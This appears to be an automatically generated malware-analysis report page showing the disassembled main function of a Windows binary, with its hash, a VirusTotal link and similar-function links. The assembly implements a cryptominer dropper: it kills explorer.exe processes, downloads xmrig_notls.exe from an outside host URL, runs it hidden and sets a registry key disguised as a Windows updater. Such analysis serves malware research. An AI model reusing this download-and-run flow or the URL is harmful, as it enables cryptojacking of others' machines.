---
layout: post
title:  "main @ fca52b995e756cff97168f6fef94b37d"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** main
- **Origin (md5):** fca52b995e756cff97168f6fef94b37d
- **VirusTotal:** [virustotal.com/gui/file/fca52b995e756cff97168f6fef94b37d][virustotal_ref]

# Code Tags
<span class="tag" id="HTTP">HTTP</span>
<span class="tag" id="PROCESS">PROCESS</span>


# Similar Functions

1. [fcn.00438d70][similar_1_ref] (sim.: 0.9265545394816559)
2. [fcn.00429b10][similar_2_ref] (sim.: 0.9225819923670773)
3. [fcn.00453842][similar_3_ref] (sim.: 0.9220338364838753)
4. [fcn.004034a9][similar_4_ref] (sim.: 0.9173719003522569)
5. [fcn.004034a9][similar_5_ref] (sim.: 0.9173719003522569)


# Disassembled Code

{% highlight nasm %}
push ebp
mov ebp,esp
and esp,0xfffffff0
sub esp,0x908
mov eax,dword[0x41b010]
xor eax,esp
mov dword[esp+0x904],eax
push esi
push edi
xor eax,eax
mov dword[esp+0x10],0
push 0x800
push eax
mov word[esp+0x30],ax
lea eax,[esp+0x110]
push eax
mov dword[esp+0x44],0
mov dword[esp+0x48],7
call fcn.00406cb0
add esp,0xc
lea eax,[esp+0x108]
push eax
push 0
push 0
push 0x1a
push 0
call dword[sym.imp.SHELL32.dll_SHGetFolderPathW]
test eax,eax
jne 0x402d06
lea ecx,[esp+0x108]
lea edx,[ecx+2]
mov ax,word[ecx]
add ecx,2
test ax,ax
jne 0x402ce5
sub ecx,edx
lea eax,[esp+0x108]
sar ecx,1
push ecx
push eax
lea ecx,[esp+0x30]
call fcn.004011e0
push str.Microsoftexplorer.exe
lea ecx,[esp+0x2c]
call fcn.00401320
xor ecx,ecx
movups xmm0,xmmword[eax]
movups xmmword[esp+0x70],xmm0
movq xmm0,qword[eax+0x10]
movq qword[esp+0x80],xmm0
mov dword[eax+0x10],0
mov dword[eax+0x14],7
mov word[eax],cx
mov edx,dword[esp+0x3c]
cmp edx,8
jb 0x402d79
mov ecx,dword[esp+0x28]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x402d6f
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403401
push edx
push ecx
call fcn.00404ff5
add esp,8
lea eax,[esp+0x70]
push eax
lea ecx,[esp+0x44]
call fcn.004039b0
push 0x41ca3c
push fcn.00403d50
push 0x41ca30
call fcn.00404336
add esp,0xc
test eax,eax
je 0x403406
push 0x41ca3c
push fcn.00403d50
push 0x41ca30
call fcn.00404336
add esp,0xc
test eax,eax
je 0x40340b
cmp dword[esp+0x54],8
lea ecx,[esp+0x10]
lea eax,[esp+0x40]
cmovae eax,dword[esp+0x40]
push ecx
push eax
call fcn.004043ca
add esp,8
cmp eax,8
je 0x402e19
cmp eax,0xffffffff
je 0x402e19
lea eax,[esp+0x70]
push eax
lea ecx,[esp+0x2c]
call fcn.004039b0
lea ecx,[esp+0x28]
call fcn.004027b0
cmp eax,0x173a00
jne 0x402e0d
test edx,edx
je 0x402e20
mov byte[esp+0xf],1
mov eax,3
jmp 0x402e2a
mov eax,1
jmp 0x402e25
mov eax,3
mov byte[esp+0xf],0
test al,2
je 0x402e81
mov edx,dword[esp+0x3c]
cmp edx,8
jb 0x402e6a
mov ecx,dword[esp+0x28]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x402e60
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403410
push edx
push ecx
call fcn.00404ff5
add esp,8
xor eax,eax
mov dword[esp+0x38],0
mov dword[esp+0x3c],7
mov word[esp+0x28],ax
mov edx,dword[esp+0x54]
cmp edx,8
jb 0x402ebd
mov ecx,dword[esp+0x40]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x402eb3
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403410
push edx
push ecx
call fcn.00404ff5
add esp,8
cmp byte[esp+0xf],0
mov edi,dword[sym.imp.KERNEL32.dll_CloseHandle]
je 0x403119
lea eax,[esp+0x70]
push eax
lea ecx,[esp+0x5c]
call fcn.004039b0
lea ecx,[esp+0x58]
call fcn.00402730
mov edx,dword[esp+0x6c]
mov byte[esp+0xf],al
cmp edx,8
jb 0x402f29
mov ecx,dword[esp+0x58]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x402f1b
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403415
push edx
push ecx
call fcn.00404ff5
mov al,byte[esp+0x17]
add esp,8
test al,al
je 0x403056
push 0xc
xor eax,eax
mov dword[esp+0x3c],0
push str.explorer.exe
lea ecx,[esp+0x30]
mov dword[esp+0x44],7
mov word[esp+0x30],ax
call fcn.004011e0
push 0
push 0xf
call dword[sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot]
lea ecx,[esp+0x108]
mov dword[esp+0x10],eax
push ecx
push eax
mov dword[esp+0x110],0x22c
call dword[sym.imp.KERNEL32.dll_Process32FirstW]
mov edi,dword[esp+0x28]
test eax,eax
je 0x40300e
nop dword[eax]
cmp dword[esp+0x3c],8
lea eax,[esp+0x28]
lea ecx,[esp+0x12c]
cmovae eax,edi
mov dx,word[ecx]
cmp dx,word[eax]
jne 0x402fc9
test dx,dx
je 0x402fc5
mov dx,word[ecx+2]
cmp dx,word[eax+2]
jne 0x402fc9
add ecx,4
add eax,4
test dx,dx
jne 0x402fa3
xor eax,eax
jmp 0x402fce
sbb eax,eax
or eax,1
test eax,eax
jne 0x402ff8
push dword[esp+0x110]
push eax
push 1
call dword[sym.imp.KERNEL32.dll_OpenProcess]
mov esi,eax
test esi,esi
je 0x402ff8
push 9
push esi
call dword[sym.imp.KERNEL32.dll_TerminateProcess]
push esi
call dword[sym.imp.KERNEL32.dll_CloseHandle]
lea eax,[esp+0x108]
push eax
push dword[esp+0x14]
call dword[sym.imp.KERNEL32.dll_Process32NextW]
test eax,eax
jne 0x402f90
push dword[esp+0x10]
call dword[sym.imp.KERNEL32.dll_CloseHandle]
mov eax,dword[esp+0x3c]
cmp eax,8
jb 0x403050
lea ecx,[eax*2+2]
mov eax,edi
cmp ecx,0x1000
jb 0x403046
mov edi,dword[edi-4]
add ecx,0x23
sub eax,edi
add eax,0xfffffffc
cmp eax,0x1f
ja 0x40341a
push ecx
push edi
call fcn.00404ff5
add esp,8
mov edi,dword[sym.imp.KERNEL32.dll_CloseHandle]
lea eax,[esp+0x70]
push eax
lea ecx,[esp+0x5c]
call fcn.004039b0
push 0x41ca3c
push fcn.00403d50
push 0x41ca30
mov dword[esp+0x1c],0
call fcn.00404336
add esp,0xc
test eax,eax
je 0x403406
lea edx,[esp+0x10]
mov dword[esp+0x14],0x41ca3c
lea ecx,[esp+0x58]
call fcn.00402990
push 0x41ca3c
push fcn.00403d50
push 0x41ca30
call fcn.00404336
add esp,0xc
test eax,eax
je 0x403406
mov eax,dword[esp+0x14]
mov eax,dword[eax+4]
cmp eax,dword[0x41ca40]
jne 0x403429
cmp dword[esp+0x10],0
jne 0x403429
mov edx,dword[esp+0x6c]
cmp edx,8
jb 0x403119
mov ecx,dword[esp+0x58]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x40310f
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x40341f
push edx
push ecx
call fcn.00404ff5
add esp,8
cmp dword[esp+0x84],8
lea eax,[esp+0x70]
push 0
cmovae eax,dword[esp+0x74]
push 0
push eax
push str.http:__osdsoft.com_update20180524_xmrig_notls.exe
push 0
call dword[sym.imp.urlmon.dll_URLDownloadToFileW]
test eax,eax
jne 0x4033aa
call fcn.00404321
mov ecx,eax
cmp ecx,1
jbe 0x403151
dec ecx
lea esi,[esp+0x106]
nop dword[eax+eax]
mov eax,0xcccccccd
sub esi,2
mul ecx
shr edx,3
lea eax,[edx+edx*4]
add eax,eax
sub ecx,eax
add ecx,0x30
mov word[esi],cx
mov ecx,edx
test ecx,ecx
jne 0x403160
xor eax,eax
mov dword[esp+0x38],edx
mov word[esp+0x28],ax
lea eax,[esp+0x106]
mov dword[esp+0x3c],7
cmp esi,eax
je 0x4031ad
sub eax,esi
lea ecx,[esp+0x28]
sar eax,1
push eax
push esi
call fcn.004011e0
lea eax,[esp+0x28]
push eax
push ecx
lea edx,[esp+0x78]
lea ecx,[esp+0x60]
call fcn.004015a0
add esp,4
lea ecx,[esp+0x44]
mov edx,eax
call fcn.00401420
add esp,4
mov dword[esp+0x90],0x44
cmp dword[esp+0x54],8
lea ecx,[esp+0x10]
xorps xmm0,xmm0
lea eax,[esp+0x40]
cmovae eax,dword[esp+0x40]
push ecx
lea ecx,[esp+0x94]
movlpd qword[esp+0x98],xmm0
push ecx
push 0
push 0
push 0x8000000
push 1
push 0
push 0
push eax
push 0
movlpd qword[esp+0xc4],xmm0
movlpd qword[esp+0xcc],xmm0
movlpd qword[esp+0xd4],xmm0
movlpd qword[esp+0xdc],xmm0
movlpd qword[esp+0xe4],xmm0
movlpd qword[esp+0xec],xmm0
movlpd qword[esp+0xf4],xmm0
movaps xmmword[esp+0x38],xmm0
call dword[sym.imp.KERNEL32.dll_CreateProcessW]
push dword[esp+0x10]
call edi
push dword[esp+0x14]
call edi
mov edx,dword[esp+0x54]
cmp edx,8
jb 0x4032a7
mov ecx,dword[esp+0x40]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x40329d
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403424
push edx
push ecx
call fcn.00404ff5
add esp,8
mov edx,dword[esp+0x6c]
cmp edx,8
jb 0x4032e3
mov ecx,dword[esp+0x58]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x4032d9
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403468
push edx
push ecx
call fcn.00404ff5
add esp,8
mov edx,dword[esp+0x3c]
xor eax,eax
mov dword[esp+0x68],0
mov dword[esp+0x6c],7
mov word[esp+0x58],ax
cmp edx,8
jb 0x403336
mov ecx,dword[esp+0x28]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x40332c
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x403468
push edx
push ecx
call fcn.00404ff5
add esp,8
sub esp,0x18
xor eax,eax
mov ecx,esp
push 1
mov dword[ecx+0x10],0
mov dword[ecx+0x14],7
push 0x4186a8
mov word[ecx],ax
call fcn.004011e0
sub esp,0x18
xor eax,eax
mov ecx,esp
push 9
mov dword[ecx+0x10],0
mov dword[ecx+0x14],7
push 0x4186ac
mov word[ecx],ax
call fcn.004011e0
sub esp,0x18
xor eax,eax
mov ecx,esp
push 0x1c
mov dword[ecx+0x10],0
mov dword[ecx+0x14],7
push str.SoftwareWindowsUpdaterxmru
mov word[ecx],ax
call fcn.004011e0
call fcn.00402b20
add esp,0x48
mov edx,dword[esp+0x84]
cmp edx,8
jb 0x4033e9
mov ecx,dword[esp+0x70]
lea edx,[edx*2+2]
mov eax,ecx
cmp edx,0x1000
jb 0x4033df
mov ecx,dword[ecx-4]
add edx,0x23
sub eax,ecx
add eax,0xfffffffc
cmp eax,0x1f
ja 0x40346d
push edx
push ecx
call fcn.00404ff5
add esp,8
mov ecx,dword[esp+0x90c]
xor eax,eax
pop edi
pop esi
xor ecx,esp
call fcn.00404d1a
mov esp,ebp
pop ebp
ret 0x10
call fcn.004088d8
call fcn.00408aaf
call fcn.00408aaf
call fcn.004088d8
call fcn.004088d8
call fcn.004088d8
call fcn.004088d8
call fcn.004088d8
push str.remove_p_:_invalid_argument
lea ecx,[esp+0x44]
call fcn.00403610
lea ecx,[esp+0x10]
call fcn.00401d90
lea ecx,[esp+0x90]
push dword[eax+4]
push dword[eax]
lea eax,[esp+0x48]
push eax
call fcn.004024a0
push 0x41973c
lea eax,[esp+0x94]
push eax
call fcn.00406135
call fcn.004088d8
call fcn.004088d8
int3
{% endhighlight %}


[similar_1_ref]: /report/fcn.00438d70@4fe6510221c33bf023f6abed461fc13f
[similar_2_ref]: /report/fcn.00429b10@1123b7aa5760238fe93045e585b8234c
[similar_3_ref]: /report/fcn.00453842@20a93604f17ee6f3c2aa7b1f7a497fcf
[similar_4_ref]: /report/fcn.004034a9@912f1d013a0d6151bc7a7cef6da1b2a0
[similar_5_ref]: /report/fcn.004034a9@152885a790b99953ce23874f0947b7bd
[virustotal_ref]: https://www.virustotal.com/gui/file/fca52b995e756cff97168f6fef94b37d